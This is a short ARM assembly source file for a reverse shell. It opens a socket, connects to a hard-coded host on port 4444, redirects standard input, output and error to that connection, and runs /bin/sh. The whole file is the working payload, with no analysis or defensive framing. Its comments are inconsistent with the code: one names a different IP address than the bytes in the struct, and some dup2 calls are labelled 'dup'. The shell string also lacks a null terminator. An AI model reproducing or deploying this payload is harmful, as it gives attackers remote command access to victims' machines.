// reverse shell ARM code

.section .text
.global _start

_start:
	mov r0, #2;
	mov r1, #1;
	mov r2, #0;
	movw r7, #281;
	svc #0;			// call socket(PF_INET, SOCK_STREAM, IPPROTO_IP) 
	mov r4, r0;		//maintain our socket address needed for the dup2 functions later on

	adr r1, struct;		//ptr to our ip and port address below
	mov r2, #16;
	movw r7, #283;
	svc #0;			// call connect(3, "192.168.200.1", 16)

	mov r0, r4;
	mov r1, #2;
	mov r7, #63; 
	svc #0;			//dup2(3,2) stderr

	mov r0, r4;
	mov r1, #1;
	mov r7, #63; 
	svc #0;			//dup(3,1) stdout

	mov r0, r4;
	mov r1, #0;
	mov r7, #63; 
	svc #0;			//dup(3,0) stdin

	adr r0, shell;		//ptr to the string /bin/sh
	mov r1, #0;
	mov r2, #0;
	mov r7, #11; 
	svc #0;			//call execve("/bin/sh")

struct:
	.ascii "\x02\x00"
	.ascii "\x11\x5c"
	.byte 172,16,1,1	

shell:
	.ascii "/bin/sh"
